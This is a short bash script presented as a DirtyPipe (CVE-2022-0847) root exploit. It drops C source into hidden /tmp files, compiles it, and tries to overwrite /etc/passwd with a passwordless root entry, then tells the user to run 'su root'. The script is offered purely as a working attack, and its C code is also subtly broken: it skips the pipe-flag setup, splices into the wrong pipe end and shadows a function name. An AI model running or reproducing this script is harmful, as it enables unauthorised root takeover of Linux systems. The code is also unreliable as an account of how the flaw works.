#!/bin/bash
cd "$(dirname "$0")"
echo "[*] CVE-2022-0847 DirtyPipe"
K=$(uname -r)
echo "[*] Kernel: $K"
cat > /tmp/.dp.c << 'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
static void p(const char *path,loff_t off,const char *d,size_t l){
int fd=open(path,O_RDONLY);if(fd<0)return;
int p[2];pipe(p);
write(p[1],"x",1);
splice(fd,&off,p[0],NULL,1,0);
write(p[1],d,l);
close(fd);close(p[0]);close(p[1]);
}
int main(int c,char **v){
if(c<2){printf("Usage: %s file\n",v[0]);return 1;}
char *d="root::0:0:root:/root:/bin/bash\n";
p(v[1],4,d,strlen(d));
return 0;
}
EOF
gcc -o /tmp/.dp /tmp/.dp.c 2>/dev/null
if [ ! -f /tmp/.dp ];then echo "[-] Compile failed";exit 1;fi
echo "[+] Compiled"
cp /etc/passwd /tmp/.passwd.bak
echo "[*] Overwriting /etc/passwd..."
/tmp/.dp /etc/passwd
echo "[+] Done. Try: su root (no password)"
